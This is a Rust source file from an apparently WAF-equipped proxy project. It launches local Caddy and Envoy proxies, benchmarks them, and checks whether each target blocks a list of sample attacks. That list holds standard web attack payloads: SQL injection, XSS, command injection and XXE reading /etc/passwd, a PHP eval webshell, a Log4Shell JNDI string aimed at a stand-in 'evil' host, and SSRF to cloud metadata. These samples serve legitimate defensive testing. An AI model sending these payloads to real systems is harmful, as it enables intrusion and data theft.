        })
    } else {
        None
    }
}

// --- Caddy ------------------------------------------------------------------

fn caddy_binary() -> Option<String> {
    find_binary(&["/usr/bin/caddy", "/usr/local/bin/caddy"], "caddy")
}

fn caddy_version(bin: &str) -> Option<String> {
    let out = std::process::Command::new(bin)
        .arg("version")
        .output()
        .ok()?;
    // Caddy prints to stdout: "v2.6.2 h1:...".
    let s = String::from_utf8_lossy(&out.stdout);
    s.lines()
        .next()
        .and_then(|l| l.split_whitespace().next())
        .map(|t| t.to_string())
        .filter(|s| !s.is_empty())
}

async fn launch_caddy(upstream: SocketAddr) -> Option<LaunchedProxy> {
    let bin = caddy_binary()?;
    let port = free_loopback_port().await?;
    let dir = run_dir("caddy", port);
    std::fs::create_dir_all(&dir).ok()?;
    for sub in ["data", "xdg-config", "xdg-data"] {
        let _ = std::fs::create_dir_all(dir.join(sub));
    }

    let conf = dir.join("Caddyfile");
    // Global block MUST be first. admin off removes the :2019 listener so
    // concurrent instances never clash; auto_https off + http:// scheme means
    // pure HTTP, no privileged :80 redirect listener.
    let conf_body = format!(
        "{{\n\
         \tadmin off\n\
         \tauto_https off\n\
         \tstorage file_system {dir}/data\n\
         \tlog {{\n\
         \t\toutput discard\n\
         \t}}\n\
         }}\n\
         \n\
         http://127.0.0.1:{port} {{\n\
         \treverse_proxy {upstream}\n\
         }}\n",
        dir = dir.display(),
        port = port,
        upstream = upstream,
    );
    std::fs::write(&conf, conf_body).ok()?;

    // `caddy run` blocks foreground; `caddy start` daemonizes and detaches.
    let child = std::process::Command::new(&bin)
        .arg("run")
        .arg("--config")
        .arg(&conf)
        .arg("--adapter")
        .arg("caddyfile")
        .env("XDG_CONFIG_HOME", dir.join("xdg-config"))
        .env("XDG_DATA_HOME", dir.join("xdg-data"))
        .env("HOME", &dir)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .ok()?;
    let run = ProxyRun { child, dir };
    let addr: SocketAddr = format!("127.0.0.1:{port}").parse().ok()?;
    if wait_for_bind(addr, 40).await {
        Some(LaunchedProxy {
            run,
            addr,
            version: caddy_version(&bin),
        })
    } else {
        None
    }
}

// --- Envoy ------------------------------------------------------------------

fn envoy_binary() -> Option<String> {
    find_binary(&["/usr/local/bin/envoy", "/usr/bin/envoy"], "envoy")
}

fn envoy_version(bin: &str) -> Option<String> {
    let out = std::process::Command::new(bin)
        .arg("--version")
        .output()
        .ok()?;
    // Envoy prints to stdout: "envoy  version: <sha>/<version>/<status>/...".
    let s = String::from_utf8_lossy(&out.stdout);
    let line = s.lines().next()?;
    let after = line.split("version:").nth(1)?.trim();
    // "<sha>/<version>/<status>/..." → field [1].
    after
        .split('/')
        .nth(1)
        .map(|t| t.trim().to_string())
        .filter(|s| !s.is_empty())
        .or_else(|| Some(after.split_whitespace().next().unwrap_or(after).to_string()))
}

async fn launch_envoy(upstream: SocketAddr) -> Option<LaunchedProxy> {
    let bin = envoy_binary()?;
    let port = free_loopback_port().await?;
    let dir = run_dir("envoy", port);
    std::fs::create_dir_all(&dir).ok()?;

    let conf = dir.join("envoy.yaml");
    // Minimal HCM → router → STATIC cluster reverse proxy. {LISTEN}/{UPSTREAM}
    // are bare integers (port_value is an int; a quoted value is rejected).
    let upstream_ip = upstream.ip();
    let upstream_port = upstream.port();
    let conf_body = format!(
        "node:\n\
         \x20\x20id: aegis-bench\n\
         \x20\x20cluster: aegis-bench\n\
         \n\
         static_resources:\n\
         \x20\x20listeners:\n\
         \x20\x20- name: listener_0\n\
         \x20\x20\x20\x20address:\n\
         \x20\x20\x20\x20\x20\x20socket_address: {{ address: 127.0.0.1, port_value: {listen} }}\n\
         \x20\x20\x20\x20filter_chains:\n\
         \x20\x20\x20\x20- filters:\n\
         \x20\x20\x20\x20\x20\x20- name: envoy.filters.network.http_connection_manager\n\
         \x20\x20\x20\x20\x20\x20\x20\x20typed_config:\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\"@type\": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20stat_prefix: ingress_http\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20codec_type: AUTO\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20common_http_protocol_options:\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20idle_timeout: 65s\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20route_config:\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20name: local_route\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20virtual_hosts:\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20- name: backend\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20domains: [\"*\"]\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20routes:\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20- match: {{ prefix: \"/\" }}\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20route: {{ cluster: upstream }}\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20http_filters:\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20- name: envoy.filters.http.router\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20typed_config:\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\"@type\": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router\n\
         \x20\x20clusters:\n\
         \x20\x20- name: upstream\n\
         \x20\x20\x20\x20connect_timeout: 1s\n\
         \x20\x20\x20\x20type: STATIC\n\
         \x20\x20\x20\x20lb_policy: ROUND_ROBIN\n\
         \x20\x20\x20\x20load_assignment:\n\
         \x20\x20\x20\x20\x20\x20cluster_name: upstream\n\
         \x20\x20\x20\x20\x20\x20endpoints:\n\
         \x20\x20\x20\x20\x20\x20- lb_endpoints:\n\
         \x20\x20\x20\x20\x20\x20\x20\x20- endpoint:\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20address:\n\
         \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20socket_address: {{ address: {up_ip}, port_value: {up_port} }}\n",
        listen = port,
        up_ip = upstream_ip,
        up_port = upstream_port,
    );
    std::fs::write(&conf, conf_body).ok()?;

    let ncpu = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(1);
    // --use-dynamic-base-id eliminates hot-restart SHM base-id collisions.
    let child = std::process::Command::new(&bin)
        .arg("-c")
        .arg(&conf)
        .arg("--use-dynamic-base-id")
        .arg("--concurrency")
        .arg(ncpu.to_string())
        .arg("--log-level")
        .arg("error")
        .arg("--log-path")
        .arg(dir.join("envoy.log"))
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .ok()?;
    let run = ProxyRun { child, dir };
    let addr: SocketAddr = format!("127.0.0.1:{port}").parse().ok()?;
    // Envoy warms clusters/validates xDS before binding → slower; ~3s.
    if wait_for_bind(addr, 60).await {
        Some(LaunchedProxy {
            run,
            addr,
            version: envoy_version(&bin),
        })
    } else {
        None
    }
}

/// Launch the ephemeral proxy for a given target kind, reverse-proxying to the
/// shared upstream. Returns `None` (→ available:false) when the binary is
/// missing or the proxy never binds. AEGIS kinds never reach here.
async fn launch_proxy(kind: TargetKind, upstream: SocketAddr) -> Option<LaunchedProxy> {
    match kind {
        TargetKind::Nginx => launch_nginx(upstream).await,
        TargetKind::NginxModSec => launch_nginx_modsec(upstream).await,
        TargetKind::HaProxy => launch_haproxy(upstream).await,
        TargetKind::Caddy => launch_caddy(upstream).await,
        TargetKind::Envoy => launch_envoy(upstream).await,
        TargetKind::AegisRaw | TargetKind::AegisWaf => None,
    }
}

// ---------------------------------------------------------------------------
// Security payload set + live proxy probing.
// ---------------------------------------------------------------------------

/// (display name, sample payload as a request path). The WAF matcher
/// canonicalises internally; proxies receive it as a GET path.
const SECURITY_CASES: &[(&str, &str)] = &[
    ("SQL injection", "/?id=1 union select password from users"),
    ("XSS", "/?q=<script>alert(1)</script>"),
    ("Path traversal", "/?file=../../../../etc/passwd"),
    ("Command injection", "/?host=127.0.0.1;cat /etc/passwd"),
    ("PHP webshell", "/?c=eval($_POST[0])"),
    ("Webshell drop", "/uploads/c99.php"),
    ("Log4Shell / RCE", "/?x=${jndi:ldap://evil/a}"),
    (
        "LFI (php wrapper)",
        "/?p=php://filter/convert.base64-encode/resource=index",
    ),
    (
        "SSRF (metadata)",
        "/?url=http://169.254.169.254/latest/meta-data/",
    ),
    (
        "XXE",
        "/?xml=<!DOCTYPE foo [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>",
    ),
];

/// Percent-encode an attack payload so it forms a VALID HTTP request line.
/// The raw samples contain spaces, `<`, `>`, `"`, `{`, `}`, `;`, `$`, … — sent
/// verbatim they make a malformed request line, so a bare proxy returns 400 on
/// the HTTP *parse* (not a WAF decision), which would falsely read as "blocked".
/// WAFs (AEGIS, ModSecurity/CRS) URL-decode before matching, so encoded attacks
/// still trip them; a bare proxy forwards the now-valid request to the origin
/// (200) → correctly read as "passed". Structural URL chars (`/?=&:.`) are kept.
fn encode_for_wire(path: &str) -> String {
    let mut out = String::with_capacity(path.len() * 2);
    for &b in path.as_bytes() {
        match b {
            b'A'..=b'Z'
            | b'a'..=b'z'
            | b'0'..=b'9'
            | b'-'
            | b'.'
            | b'_'
            | b'~'
            | b'/'
            | b'?'
            | b'='
            | b'&'
            | b':'
            | b'%' => out.push(b as char),
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

/// Send `path` as a GET request through `proxy_addr` to the upstream and return
/// the HTTP status code from the response status line. `None` on any I/O error.
async fn probe(proxy_addr: SocketAddr, path: &str) -> Option<u16> {
    let mut stream = TcpStream::connect(proxy_addr).await.ok()?;
    let _ = stream.set_nodelay(true);
    let enc = encode_for_wire(path);
    let req = format!("GET {enc} HTTP/1.1\r\nHost: bench.local\r\nConnection: close\r\n\r\n");
    stream.write_all(req.as_bytes()).await.ok()?;
    let mut buf = Vec::with_capacity(1024);
    let mut tmp = [0u8; 1024];
    // Read just enough to capture the status line.
    loop {
        match tokio::time::timeout(Duration::from_millis(500), stream.read(&mut tmp)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => {
                buf.extend_from_slice(&tmp[..n]);
                if buf.windows(2).any(|w| w == b"\r\n") {
                    break;
                }
                if buf.len() > 4096 {
                    break;
                }
            }
            _ => break,
        }
    }
    let head = String::from_utf8_lossy(&buf);
    let line = head.lines().next()?;
    // "HTTP/1.1 403 Forbidden" → 403.
    line.split_whitespace()
        .nth(1)
        .and_then(|c| c.parse::<u16>().ok())
}

// ---------------------------------------------------------------------------
// Orchestration.
// ---------------------------------------------------------------------------

/// A measured/launched proxy target retained until probing is done.
struct LiveProxy {
    name: &'static str,
    _run: ProxyRun,
    addr: SocketAddr,
}

/// Run the multi-target comparison.
///
/// `engine` is the proxy's live `Arc<FilterEngine>` when the caller wired it
/// in (approach A — the AEGIS+WAF target then runs the FULL filter chain per
/// request). When `None`, it falls back to a standalone `WafFilter` scan
/// (approach B). The engine handle is plumbed from `bin/aegis-pingora` →
/// `AdminProxy::with_engine` → the compare run handler.
pub async fn run_comparison(
    engine: Option<Arc<crate::filters::engine::FilterEngine>>,
) -> ComparisonResult {
    let started_at_unix = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let wall = Instant::now();

    let work = async {
        // Shared in-process upstream U — one instance for the whole run; every
        // proxy reverse-proxies to it.
        let (upstream_addr, upstream_srv) = match spawn_inprocess_server().await {
            Ok(p) => p,
            Err(e) => return ComparisonResult::error(format!("upstream bind failed: {e}")),
        };

        // The in-process WAF for AEGIS security verdicts (signature matcher).
        let waf = crate::filters::waf::WafFilter::new(&crate::config::WafConfig {
            enabled: true,
            ..Default::default()
        });

        // AEGIS+WAF inspector for the protected-throughput measurement.
        let inspector = Arc::new(match engine {
            Some(e) => Inspector::Engine(e),
            None => Inspector::Waf(Arc::new(crate::filters::waf::WafFilter::new(
                &crate::config::WafConfig {
                    enabled: true,
                    ..Default::default()
                },
            ))),
        });
        let _ = inspector.label(); // tag chosen inspector (future logging)

        let mut targets: Vec<TargetResult> = Vec::with_capacity(TARGETS.len());
        // Live proxies kept alive until all probing is done.
        let mut live: Vec<LiveProxy> = Vec::new();

        // Build targets in display order. Proxies launch + measure sequentially
        // (each binds a port); AEGIS lanes are measured in-process.
        for spec in TARGETS {
            match spec.kind {
                TargetKind::AegisRaw => {
                    // AEGIS's bare async proxy stack — reverse-proxies to the
                    // SAME upstream U as every other target (no inspection).
                    match spawn_aegis_proxy(upstream_addr, None).await {
                        Ok((addr, srv)) => {
                            let m = measure(addr).await;
                            srv.abort();
                            targets.push(measured(spec, m, None));
                        }
                        Err(_) => targets.push(unavailable(spec)),
                    }
                }
                TargetKind::AegisWaf => {
                    // Same proxy stack + AEGIS's real per-request filter pipeline.
                    match spawn_aegis_proxy(upstream_addr, Some(Arc::clone(&inspector))).await {
                        Ok((addr, srv)) => {
                            let m = measure(addr).await;
                            srv.abort();
                            targets.push(measured(spec, m, None));
                        }
                        Err(_) => targets.push(unavailable(spec)),
                    }
                }
                _ => match launch_proxy(spec.kind, upstream_addr).await {
                    Some(p) => {
                        let m = measure(p.addr).await;
                        targets.push(measured(spec, m, p.version.clone()));
                        live.push(LiveProxy {
                            name: spec.name,
                            _run: p.run,
                            addr: p.addr,
                        });
                    }
                    None => targets.push(unavailable(spec)),
                },
            }
        }

        // Build security rows: one SecVerdict per target, in display order.
        // AEGIS lanes use the in-process WAF matcher; live proxies are probed.
        let mut security: Vec<SecurityRow> = Vec::with_capacity(SECURITY_CASES.len());
        for (name, sample) in SECURITY_CASES {
            let cat = waf.signature_category(sample);
            let mut verdicts: Vec<SecVerdict> = Vec::with_capacity(TARGETS.len());
            for spec in TARGETS {
                let verdict = match spec.kind {
                    TargetKind::AegisRaw => SecVerdict {
                        target: spec.name.to_string(),
                        blocked: false, // raw stack has no WAF
                        applicable: true,
                    },
                    TargetKind::AegisWaf => SecVerdict {
                        target: spec.name.to_string(),
                        blocked: cat.is_some(),
                        applicable: true,
                    },
                    _ => match live.iter().find(|p| p.name == spec.name) {
                        Some(p) => {
                            let status = probe(p.addr, sample).await;
                            SecVerdict {
                                target: spec.name.to_string(),
                                blocked: matches!(status, Some(s) if (400..500).contains(&s)),
                                applicable: true,
                            }
                        }
                        None => SecVerdict {
                            target: spec.name.to_string(),
                            blocked: false,
                            applicable: false,
                        },
                    },
                };
                verdicts.push(verdict);
            }
            security.push(SecurityRow {
                attack: (*name).to_string(),
                sample: (*sample).to_string(),
                category: cat.unwrap_or("-").to_string(),
                verdicts,
            });
        }

        // Tear down: drop live proxies (Drop kills + cleans), abort upstream.
        drop(live);
        upstream_srv.abort();

        ComparisonResult {
            ok: true,
            status: "done".into(),
            error: None,
            started_at_unix: Some(started_at_unix),
            duration_ms: Some(wall.elapsed().as_millis() as u64),
            targets,
            security,
            caveat: CAVEAT.into(),
        }
    };

    match tokio::time::timeout(TOTAL_BUDGET, work).await {
        Ok(r) => r,
        Err(_) => ComparisonResult::error("comparison exceeded the global time budget".into()),
    }
}

/// A target whose binary is absent (or which failed to launch): zeroed
/// throughput, unavailable.
fn unavailable(spec: &TargetSpec) -> TargetResult {
    TargetResult {
        name: spec.name.to_string(),
        kind: spec.kind_str.to_string(),
        available: false,
        version: None,
        throughput_rps: 0.0,
        p50_ms: 0.0,
        p99_ms: 0.0,
        has_waf: spec.has_waf,
    }
}

/// A successfully-measured target.
fn measured(spec: &TargetSpec, m: (u64, f64, f64, u64), version: Option<String>) -> TargetResult {
    TargetResult {
        name: spec.name.to_string(),
        kind: spec.kind_str.to_string(),
        available: true,
        version,
        throughput_rps: m.0 as f64,
        p50_ms: m.1,
        p99_ms: m.2,
        has_waf: spec.has_waf,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build the security rows the way `run_comparison` does for the in-process
    /// WAF lanes (no proxies launched) — used to assert AEGIS verdicts.
    fn aegis_security_rows() -> Vec<SecurityRow> {
        let waf = crate::filters::waf::WafFilter::new(&crate::config::WafConfig {
            enabled: true,
            ..Default::default()
        });
        SECURITY_CASES
            .iter()
            .map(|(name, sample)| {
                let cat = waf.signature_category(sample);
                let verdicts = TARGETS
                    .iter()
                    .map(|spec| match spec.kind {
                        TargetKind::AegisRaw => SecVerdict {
                            target: spec.name.to_string(),
                            blocked: false,
                            applicable: true,
                        },
                        TargetKind::AegisWaf => SecVerdict {
                            target: spec.name.to_string(),
                            blocked: cat.is_some(),
                            applicable: true,
                        },
                        // No proxies launched in tests → unavailable.
                        _ => SecVerdict {
                            target: spec.name.to_string(),
                            blocked: false,
                            applicable: false,
                        },
                    })
                    .collect();
                SecurityRow {
                    attack: (*name).to_string(),
                    sample: (*sample).to_string(),
                    category: cat.unwrap_or("-").to_string(),
                    verdicts,
                }
            })
            .collect()
    }

    #[test]
    fn security_matrix_blocks_all_samples() {
        let rows = aegis_security_rows();
        assert!(!rows.is_empty());
        for r in &rows {
            let raw = r
                .verdicts
                .iter()
                .find(|v| v.target == "AEGIS (raw)")
                .expect("AEGIS (raw) verdict present");
            let waf = r
                .verdicts
                .iter()
                .find(|v| v.target == "AEGIS + WAF")
                .expect("AEGIS + WAF verdict present");
            assert!(
                waf.blocked,
                "AEGIS + WAF should block sample for {}: {}",
                r.attack, r.sample
            );
            assert!(waf.applicable, "AEGIS + WAF is always applicable");
            assert!(!raw.blocked, "AEGIS (raw) has no WAF → never blocks");
            assert_ne!(r.category, "-", "blocked sample must carry a category");
        }
    }

    /// Every row carries exactly one verdict per registered target, in order.
    #[test]
    fn security_rows_cover_all_targets_in_order() {
        let rows = aegis_security_rows();
        for r in &rows {
            assert_eq!(r.verdicts.len(), TARGETS.len());
            for (v, spec) in r.verdicts.iter().zip(TARGETS.iter()) {
                assert_eq!(v.target, spec.name);
            }
        }
    }

    /// Unavailable targets must report available:false / 0.0 rps and a
    /// non-applicable security verdict.
    #[test]
    fn unavailable_target_is_zeroed_and_inapplicable() {
        let spec = &TARGETS[TARGETS.len() - 1]; // Envoy (display order)
        let t = unavailable(spec);
        assert!(!t.available);
        assert_eq!(t.throughput_rps, 0.0);
        assert_eq!(t.p50_ms, 0.0);
        assert_eq!(t.p99_ms, 0.0);
        assert_eq!(t.name, spec.name);

        // In tests no proxies launch, so the proxy verdict is inapplicable.
        let rows = aegis_security_rows();
        let v = rows[0]
            .verdicts
            .iter()
            .find(|v| v.target == spec.name)
            .unwrap();
        assert!(!v.applicable);
        assert!(!v.blocked);
    }

    /// The target registry is in the contract's display order.
    #[test]
    fn target_registry_display_order() {
        let names: Vec<&str> = TARGETS.iter().map(|s| s.name).collect();
        assert_eq!(
            names,
            vec![
                "AEGIS (raw)",
                "AEGIS + WAF",
                "nginx",
                "nginx+ModSec+CRS",
                "HAProxy",
                "Caddy",
                "Envoy",
            ]
        );
        // has_waf only for the two WAF targets.
        for spec in TARGETS {
            let expect_waf = spec.name == "AEGIS + WAF" || spec.name == "nginx+ModSec+CRS";
            assert_eq!(
                spec.has_waf, expect_waf,
                "has_waf mismatch for {}",
                spec.name
            );
        }
    }

    #[test]
    fn lat_hist_percentiles_sane() {
        let h = LatHist::new();
        for _ in 0..90 {
            h.record(Duration::from_micros(60));
        }
        for _ in 0..10 {
            h.record(Duration::from_micros(40_000));
        }
        assert!(h.percentile_ms(0.50) <= 1.0);
        assert!(h.percentile_ms(0.99) >= 8.0);
    }

    #[tokio::test]
    async fn inprocess_server_serves_and_measures() {
        let (addr, srv) = spawn_inprocess_server().await.unwrap();
        let (rps, _p50, _p99, _err) = measure(addr).await;
        srv.abort();
        assert!(rps > 0, "in-process server should serve some requests");
    }

    /// The AEGIS+WAF lane must reverse-proxy to the upstream AND run the WAF
    /// inspection per request, and still serve traffic. Uses the WAF fallback
    /// inspector (no engine).
    #[tokio::test]
    async fn protected_server_runs_inspection_and_serves() {
        let (upstream, up_srv) = spawn_inprocess_server().await.unwrap();
        let waf = Arc::new(crate::filters::waf::WafFilter::new(
            &crate::config::WafConfig {
                enabled: true,
                ..Default::default()
            },
        ));
        let inspector = Arc::new(Inspector::Waf(waf));
        assert_eq!(inspector.label(), "WafFilter");
        let (addr, srv) = spawn_aegis_proxy(upstream, Some(inspector)).await.unwrap();
        let (rps, _p50, _p99, _err) = measure(addr).await;
        srv.abort();
        up_srv.abort();
        assert!(rps > 0, "AEGIS+WAF proxy should serve some requests");
    }

    /// A synthetic context must be a benign request the WAF ALLOWs — we are
    /// measuring inspection cost on the happy path, not an early deny.
    #[test]
    fn synthetic_ctx_is_benign_allow() {
        use crate::filters::{FilterAction, TrafficFilter};
        let waf = crate::filters::waf::WafFilter::new(&crate::config::WafConfig {
            enabled: true,
            ..Default::default()
        });
        let ctx = synthetic_ctx();
        assert!(
            matches!(waf.check(&ctx), FilterAction::Allow),
            "synthetic benchmark request must pass the WAF (happy-path cost)"
        );
    }

    /// probe() against the bare in-process upstream (no WAF) must see 200 →
    /// not blocked. This exercises the live-proxy probe path end to end.
    #[tokio::test]
    async fn probe_passthrough_returns_200() {
        let (addr, srv) = spawn_inprocess_server().await.unwrap();
        let status = probe(addr, "/?id=1 union select 1").await;
        srv.abort();
        assert_eq!(status, Some(200), "bare upstream forwards attacks → 200");
    }
}
